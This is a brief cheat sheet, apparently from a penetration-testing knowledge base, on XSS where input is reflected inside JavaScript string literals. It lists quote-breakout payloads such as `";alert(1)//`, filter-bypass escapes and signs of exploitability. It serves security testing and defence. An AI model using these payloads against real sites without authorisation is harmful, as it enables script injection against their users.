---
tags: xss, javascript, script-block, js-string
category: xss
---

# XSS: JavaScript String Context

## Pattern

Input reflected inside a JavaScript string literal:

```javascript
var search = "USER_INPUT";
var msg = 'Hello USER_INPUT';
var data = `template USER_INPUT`;
```

## Breakout sequences

| Quote type | Payload prefix |
|---|---|
| Double quote | `"-alert(1)-"` or `";alert(1)//` |
| Single quote | `'-alert(1)-'` or `';alert(1)//` |
| Backtick (template literal) | `` `-alert(1)-` `` |
| No quotes | Direct expression injection |

## Filter bypass patterns

- `\u0022` instead of `"` (Unicode escape)
- `\x22` hex escape
- HTML entity `&quot;` (only if reflected inside a tag attribute)
- Newline injection to break out of single-line comment: `\n`

## Signals that this is exploitable

- Input appears between string delimiters in a `<script>` block
- The string is used in `eval()`, `Function()`, or event handler
- No escaping of `"`, `'`, or `\` in the reflection

